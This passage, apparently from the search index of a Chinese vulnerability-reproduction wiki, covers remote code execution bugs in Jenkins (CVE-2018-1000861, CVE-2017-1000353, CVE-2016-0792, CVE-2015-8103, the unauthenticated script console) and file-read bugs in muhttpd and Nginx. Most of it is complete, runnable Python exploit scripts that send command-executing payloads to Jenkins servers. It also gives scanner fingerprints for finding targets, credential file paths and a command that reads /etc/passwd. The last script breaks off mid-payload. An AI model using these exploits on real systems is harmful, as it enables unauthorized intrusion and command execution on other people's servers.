","date":"0001-01-01","objectID":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/:2:0","tags":null,"title":"","uri":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/"},{"categories":null,"content":"网络测绘 app=\"Jenkins\" ","date":"0001-01-01","objectID":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/:3:0","tags":null,"title":"","uri":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/"},{"categories":null,"content":"漏洞复现 登录页面 使用 EXP 执行命令 http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript ?sandbox=true \u0026value=public class x { public x(){ \"touch /tmp/success\".execute() } 成功创建/tmp/success ","date":"0001-01-01","objectID":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/:4:0","tags":null,"title":"","uri":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python # coding: UTF-8 # author: Orange Tsai(@orange_8361) # import sys import requests from enum import Enum # remove bad SSL warnings try: requests.packages.urllib3.disable_warnings() except: pass endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript' class mode(Enum): ACL_PATCHED = 0 NOT_JENKINS = 1 READ_ENABLE = 2 READ_BYPASS = 3 ENTRY_NOTFOUND = 999 def usage(): print ''' Usage: python exp.py \u003curl\u003e \u003ccmd\u003e ''' def _log(msg, fail=False): nb = '[*]' if fail: nb = '[-]' print '%s %s' % (nb, msg) def _get(url, params=None): r = requests.get(url, verify=False, params=params) return r.status_code, r.content def _add_bypass(url): return url + 'securityRealm/user/admin/' def check(url): flag, accessible = mode.ACL_PATCHED, False # check ANONYMOUS_READ status, content = _get(url) if status == 200 and 'adjuncts' in content: flag, accessible = mode.READ_ENABLE, True _log('ANONYMOUS_READ enable!') elif status == 403: _log('ANONYMOUS_READ disable!') # check ACL bypass, CVE-2018-1000861 status, content = _get(_add_bypass(url)) if status == 200 and 'adjuncts' in content: flag, accessible = mode.READ_BYPASS, True else: flag = mode.NOT_JENKINS # check entry point, CVE-2019-1003005 if accessible: if flag is mode.READ_BYPASS: url = _add_bypass(url) status, content = _get(url + endpoint) if status == 404: flag = mode.ENTRY_NOTFOUND return flag def exploit(url, cmd): payload = 'public class x{public x(){new String(\"%s\".decodeHex()).execute()}}' % cmd.encode('hex') params = { 'sandbox': True, 'value': payload } status, content = _get(url + endpoint, params) if status == 200: _log('Exploit success!(it should be :P)') elif status == 405: _log('It seems Jenkins has patched the RCE gadget :(') else: _log('Exploit fail with HTTP status [%d]' % status, fail=True) if 'stack trace' in content: for _ in content.splitlines(): if _.startswith('Caused:'): _log(_, fail=True) if __name__ == '__main__': if len(sys.argv) != 3: usage() exit() url = sys.argv[1].rstrip('/') + '/' cmd = sys.argv[2] flag = check(url) if flag is mode.ACL_PATCHED: _log('It seems Jenkins is up-to-date(\u003e2.137) :(', fail=True) elif flag is mode.NOT_JENKINS: _log('Is this Jenkins?', fail=True) elif flag is mode.READ_ENABLE: exploit(url, cmd) elif flag is mode.READ_BYPASS: _log('Bypass with CVE-2018-1000861!') exploit(_add_bypass(url), cmd) else: _log('The `checkScript` is not found, please try other entries(see refs)', fail=True) ","date":"0001-01-01","objectID":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/:5:0","tags":null,"title":"","uri":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/"},{"categories":null,"content":"Jenkins CI 远程代码执行漏洞 CVE-2017-1000353 ","date":"0001-01-01","objectID":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/:0:0","tags":null,"title":"","uri":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/"},{"categories":null,"content":"漏洞描述 攻击者可以将序列化的Java SignedObject对象，传输到基于远程处理的Jenkins CLI，这将最终造成反序列化，进而绕过现有基于黑名单的保护机制。Altoros Jenkins for PCF 1.0.2之前所有版本都受影响，所有用户尽快升级 ","date":"0001-01-01","objectID":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/:1:0","tags":null,"title":"","uri":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/"},{"categories":null,"content":"漏洞影响 Jenkins ","date":"0001-01-01","objectID":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/:2:0","tags":null,"title":"","uri":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/"},{"categories":null,"content":"网络测绘 app=\"Jenkins\" ","date":"0001-01-01","objectID":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/:3:0","tags":null,"title":"","uri":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/"},{"categories":null,"content":"漏洞复现 登录页面 生成 jenkins_poc.ser java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser \"touch /tmp/success\" 使用Python脚本命令执行 https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py python3 jenkins.py http://xxx.xxx.xxx.xxx:8080 jenkins_poc.ser 成功生成 success ","date":"0001-01-01","objectID":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/:4:0","tags":null,"title":"","uri":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/"},{"categories":null,"content":"漏洞POC import urllib import sys import requests import uuid import threading import time import gzip import urllib3 import zlib proxies = { # 'http': 'http://127.0.0.1:8085', # 'https': 'http://127.0.0.1:8090', } URL = '%s/cli' % sys.argv[1].rstrip('/') PREAMLE = b'\u003c===[JENKINS REMOTING CAPACITY]===\u003erO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=' PROTO = b'\\x00\\x00\\x00\\x00' with open(sys.argv[2], \"rb\") as f: FILE_SER = f.read() def download(url, session): headers = {'Side' : 'download'} headers['Content-type'] = 'application/x-www-form-urlencoded' headers['Session'] = session headers['Transfer-Encoding'] = 'chunked' r = requests.post(url, data=null_payload(), headers=headers, proxies=proxies, stream=True, verify=False) print(r.content) def upload(url, session, data): headers = {'Side' : 'upload'} headers['Session'] = session headers['Content-type'] = 'application/octet-stream' headers['Accept-Encoding'] = None r = requests.post(url,data=data,headers=headers,proxies=proxies, verify=False) def upload_chunked(url,session, data): headers = {'Side' : 'upload'} headers['Session'] = session headers['Content-type'] = 'application/octet-stream' headers['Accept-Encoding']= None headers['Transfer-Encoding'] = 'chunked' headers['Cache-Control'] = 'no-cache' r = requests.post(url, headers=headers, data=create_payload_chunked(), proxies=proxies, verify=False) def null_payload(): yield b\" \" def create_payload(): payload = PREAMLE + PROTO + FILE_SER return payload def create_payload_chunked(): yield PREAMLE yield PROTO yield FILE_SER def main(): print(\"start\") session = str(uuid.uuid4()) t = threading.Thread(target=download, args=(URL, session)) t.start() time.sleep(2) print(\"pwn\") #upload(URL, session, create_payload()) upload_chunked(URL, session, \"asdf\") if __name__ == \"__main__\": main() ","date":"0001-01-01","objectID":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/:5:0","tags":null,"title":"","uri":"/jenkins-ci-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-1000353/"},{"categories":null,"content":"Jenkins script 未授权远程命令执行漏洞 ","date":"0001-01-01","objectID":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Jenkins 登录后访问 /script 页面，其中存在命令执行漏洞，当存在未授权的情况时导致服务器被入侵 ","date":"0001-01-01","objectID":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Jenkins ","date":"0001-01-01","objectID":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Jenkins\" ","date":"0001-01-01","objectID":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 账号密码存在于： Linux: /var/lib/jenkins/secrets/initialAdminPassword Windows: C:\\Users\\RabbitMask\\.jenkins\\secrets\\initialAdminPassword 登录后台，或在未授权的情况下访问 http://xxx.xxx.xxx.xxx/script 在脚本命命令模块执行系统命令 println 'cat /etc/passwd'.execute().text ","date":"0001-01-01","objectID":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/jenkins-script-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Jenkins XStream 反序列化漏洞 CVE-2016-0792 ","date":"0001-01-01","objectID":"/jenkins-xstream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-0792/:0:0","tags":null,"title":"","uri":"/jenkins-xstream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-0792/"},{"categories":null,"content":"漏洞描述 国外网站Contrast Security于2016年2月24日在公开了Jenkins近日修复的一个可通过低权限用户调用API服务致使的命令执行漏洞详情。通过低权限用户构造一个恶意的XML文档发送至服务端接口，使服务端解析时调用API执行外部命令。 ","date":"0001-01-01","objectID":"/jenkins-xstream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-0792/:1:0","tags":null,"title":"","uri":"/jenkins-xstream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-0792/"},{"categories":null,"content":"漏洞影响 jenkins版本小于1.650（1.650版本已修复该问题） ","date":"0001-01-01","objectID":"/jenkins-xstream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-0792/:2:0","tags":null,"title":"","uri":"/jenkins-xstream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-0792/"},{"categories":null,"content":"漏洞EXP #! /usr/bin/env python2 #Jenkins Groovy XML RCE (CVE-2016-0792) #Note: Although this is listed as a pre-auth RCE, during my testing it only worked if authentication was disabled in Jenkins #Made with \u003c3 by @byt3bl33d3r from __future__ import print_function import requests from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) import argparse import sys parser = argparse.ArgumentParser() parser.add_argument('target', type=str, help='Target IP:PORT') parser.add_argument('command', type=str, help='Command to run on target') parser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)') if len(sys.argv) \u003c 2: parser.print_help() sys.exit(1) args = parser.parse_args() if len(args.target.split(':')) != 2: print('[-] Target must be in format IP:PORT') sys.exit(1) if not args.command: print('[-] You must specify a command to run') sys.exit(1) ip, port = args.target.split(':') print('[*] Target IP: {}'.format(ip)) print('[*] Target PORT: {}'.format(port)) xml_formatted = '' command_list = args.command.split() for cmd in command_list: xml_formatted += '{:\u003e16}\u003cstring\u003e{}\u003c/string\u003e\\n'.format('', cmd) xml_payload = '''\u003cmap\u003e \u003centry\u003e \u003cgroovy.util.Expando\u003e \u003cexpandoProperties\u003e \u003centry\u003e \u003cstring\u003ehashCode\u003c/string\u003e \u003corg.codehaus.groovy.runtime.MethodClosure\u003e \u003cdelegate class=\"groovy.util.Expando\" reference=\"../../../..\"/\u003e \u003cowner class=\"java.lang.ProcessBuilder\"\u003e \u003ccommand\u003e {} \u003c/command\u003e \u003credirectErrorStream\u003efalse\u003c/redirectErrorStream\u003e \u003c/owner\u003e \u003cresolveStrategy\u003e0\u003c/resolveStrategy\u003e \u003cdirective\u003e0\u003c/directive\u003e \u003cparameterTypes/\u003e \u003cmaximumNumberOfParameters\u003e0\u003c/maximumNumberOfParameters\u003e \u003cmethod\u003estart\u003c/method\u003e \u003c/org.codehaus.groovy.runtime.MethodClosure\u003e \u003c/entry\u003e \u003c/expandoProperties\u003e \u003c/groovy.util.Expando\u003e \u003cint\u003e1\u003c/int\u003e \u003c/entry\u003e \u003c/map\u003e'''.format(xml_formatted.strip()) print('[*] Generated XML payload:') print(xml_payload) print() print('[*] Sending payload') headers = {'Content-Type': 'text/xml'} r = requests.post('{}://{}:{}/createItem?name=rand_dir'.format(args.proto, ip, port), verify=False, headers=headers, data=xml_payload) paths_in_trace = ['jobs/rand_dir/config.xml', 'jobs\\\\rand_dir\\\\config.xml'] if r.status_code == 500: for path in paths_in_trace: if path in r.text: print('[+] Command executed successfully') break ","date":"0001-01-01","objectID":"/jenkins-xstream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-0792/:3:0","tags":null,"title":"","uri":"/jenkins-xstream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2016-0792/"},{"categories":null,"content":"Jenkins远程代码执行漏洞 CVE-2015-8103 ","date":"0001-01-01","objectID":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/:1:0","tags":null,"title":"","uri":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/"},{"categories":null,"content":"漏洞描述 1.638之前的Jenkins和1.625.2之前的LTS中的Jenkins CLI子系统，允许远程攻击者通过制作的序列化Java对象执行有问题的commons-collections。 ","date":"0001-01-01","objectID":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/:2:0","tags":null,"title":"","uri":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/"},{"categories":null,"content":"漏洞影响 Jenkins jenkins\u003c= LTS 1.625.1 Jenkins jenkins\u003c= 1.637 ","date":"0001-01-01","objectID":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/:3:0","tags":null,"title":"","uri":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/"},{"categories":null,"content":"漏洞复现 靶场环境: https://github.com/Medicean/VulApps/tree/master/j/jenkins/1 拉取镜像并启动： $ docker pull medicean/vulapps:j_jenkins_1 $ docker run -d -p 8080:8080 -p 50000:50000 medicean/vulapps:j_jenkins_1 其中 8080 为 Jenkins web 管理端口，50000 为 Jenkins SLAVE AGENT 端口。 访问http://your-ip:8080/，看到 Jenkins Web 管理界面即代表启动成功。 ","date":"0001-01-01","objectID":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/:4:0","tags":null,"title":"","uri":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/"},{"categories":null,"content":"漏洞EXP #! /usr/bin/env python2 #Jenkins CLI RMI Java Deserialization RCE (CVE-2015-8103) #Based on the PoC by FoxGlove Security (https://github.com/foxglovesec/JavaUnserializeExploits) #Made with \u003c3 by @byt3bl33d3r from __future__ import print_function import requests from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) import socket import sys import base64 import argparse import os from subprocess import check_output ysoserial_default_paths = ['./ysoserial.jar', '../ysoserial.jar'] ysoserial_path = None parser = argparse.ArgumentParser() parser.add_argument('target', type=str, help='Target IP:PORT') parser.add_argument('command', type=str, help='Command to run on target') parser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)') parser.add_argument('--ysoserial-path', metavar='PATH', type=str, help='Path to ysoserial JAR (default: tries current and previous directory)') if len(sys.argv) \u003c 2: parser.print_help() sys.exit(1) args = parser.parse_args() if not args.ysoserial_path: for path in ysoserial_default_paths: if os.path.exists(path): ysoserial_path = path else: if os.path.exists(args.ysoserial_path): ysoserial_path = args.ysoserial_path if ysoserial_path is None: print(\"[-] Could not find ysoserial JAR file\") sys.exit(1) if len(args.target.split(':')) != 2: print('[-] Target must be in format IP:PORT') sys.exit(1) if not args.command: print('[-] You must specify a command to run') sys.exit(1) host, port = args.target.split(':') print('[*] Target IP: {}'.format(host)) print('[*] Target PORT: {}'.format(port)) print('\\n') print('[*] Retrieving the Jenkins CLI port') #Query Jenkins over HTTP to find what port the CLI listener is on r = requests.get('{}://{}:{}'.format(args.proto, host, port)) cli_port = int(r.headers['X-Jenkins-CLI-Port']) #Open a socket to the CLI port sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_address = (host, cli_port) print('[*] Connecting to Jenkins CLI on {}:{}'.format(host, cli_port)) sock.connect(server_address) # Send headers headers='\\x00\\x14\\x50\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x3a\\x43\\x4c\\x49\\x2d\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74' print('[*] Sending headers') sock.send(headers) data = sock.recv(1024) print('[*] Received \"{}\"'.format(data)) if data.find('JENKINS REMOTING CAPACITY') == -1: data = sock.recv(1024) print('[*] Received \"{}\"'.format(data)) payloadObj = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections3', args.command]) payload_b64 = base64.b64encode(payloadObj) payload='\\x3c\\x3d\\x3d\\x3d\\x5b\\x4a\\x45\\x4e\\x4b\\x49\\x4e\\x53\\x20\\x52\\x45\\x4d\\x4f\\x54\\x49\\x4e\\x47\\x20\\x43\\x41\\x50\\x41\\x43\\x49\\x54\\x59\\x5d\\x3d\\x3d\\x3d\\x3e'+payload_b64+'\\x00\\x00\\x00\\x00\\x11\\x2d\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1b\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x55\\x73\\x65\\x72\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x4c\\x00\\x10\\x63\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x50\\x72\\x6f\\x78\\x79\\x74\\x00\\x30\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x6d\\x6f\\x74\\x65\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x24\\x49\\x43\\x6c\\x61\\x73\\x73\\x4c\\x6f\\x61\\x64\\x65\\x72\\x3b\\x5b\\x00\\x07\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x74\\x00\\x02\\x5b\\x42\\x4c\\x00\\x08\\x74\\x6f\\x53\\x74\\x72\\x69\\x6e\\x67\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x03\\x49\\x00\\x02\\x69\\x64\\x49\\x00\\x08\\x6c\\x61\\x73\\x74\\x49\\x6f\\x49\\x64\\x4c\\x00\\x08\\x72\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x74\\x00\\x1a\\x4c\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2f\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2f\\x52\\x65\\x73\\x70\\x6f\\x6e\\x73\\x65\\x3b\\x78\\x72\\x00\\x17\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x72\\x65\\x6d\\x6f\\x74\\x69\\x6e\\x67\\x2e\\x43\\x6f\\x6d\\x6d\\x61\\x6e\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x01\\x4","date":"0001-01-01","objectID":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/:5:0","tags":null,"title":"","uri":"/jenkins-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2015-8103/"},{"categories":null,"content":"muhttpd 任意文件读取漏洞 CVE-2022-31793 ","date":"0001-01-01","objectID":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/:0:0","tags":null,"title":"","uri":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/"},{"categories":null,"content":"漏洞描述 muhttpd（mu-HTTP-deamon）是一个简单但完整的web服务器，用可移植的ANSI C编写。它支持静态页面、CGI脚本、基于MIME类型的处理程序和HTTPS。它在接受任何连接之前放弃特权，并且可以记录接收到的请求。它已经在GNU/Linux、NetBSD、FreeBSD、Mac OS X和Cygwin上进行了测试。它在32位和64位、小端和大端系统上成功运行。 muhttpd 1.1.7之前版本存在安全漏洞。攻击者利用该漏洞读取系统任意文件。 ","date":"0001-01-01","objectID":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/:1:0","tags":null,"title":"","uri":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/"},{"categories":null,"content":"漏洞影响 muhttpd 1.1.7 ","date":"0001-01-01","objectID":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/:2:0","tags":null,"title":"","uri":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/"},{"categories":null,"content":"网络测绘 \"2017 ARRIS Enterprises,\" ","date":"0001-01-01","objectID":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/:3:0","tags":null,"title":"","uri":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC a/etc/passwd ","date":"0001-01-01","objectID":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/:4:0","tags":null,"title":"","uri":"/muhttpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2022-31793/"},{"categories":null,"content":"Nginx越界读取缓存漏洞 CVE-2017-7529 ","date":"0001-01-01","objectID":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/:0:0","tags":null,"title":"","uri":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/"},{"categories":null,"content":"漏洞描述 Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 ","date":"0001-01-01","objectID":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/:1:0","tags":null,"title":"","uri":"/nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E-cve-2017-7529/"},{"categories":null,"content":"漏洞影响 Nginx version 0.5.6 - 1.13.2 